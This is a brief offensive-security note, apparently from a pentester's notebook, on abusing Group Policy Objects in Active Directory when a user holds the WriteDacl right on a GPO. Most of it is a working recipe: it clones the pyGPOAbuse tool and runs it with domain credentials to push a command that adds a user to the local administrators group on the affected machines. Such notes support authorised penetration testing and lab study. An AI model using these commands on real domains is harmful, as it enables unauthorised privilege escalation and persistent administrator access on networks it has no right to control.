**GPO Abuse** is an attack method used in Active Directory environments where an attacker targets Group Policy Objects (GPOs). It works by modifying GPO settings to distribute malicious configurations or scripts, allowing the attacker to gain control over systems or escalate privileges across the network.

In BloodHound, if a user has the `WriteDacl` permission on  a GPO object, they can modify the access controls on that object:

![[Pasted image 20240815224341.png]]

### Linux

```bash
git clone https://github.com/Hackndo/pyGPOAbuse.git
```

```bash
sudo python3 pygpoabuse.py domain.local/username:password -command 'net localgroup administrators usser /add' -gpo-id {object_id}
```

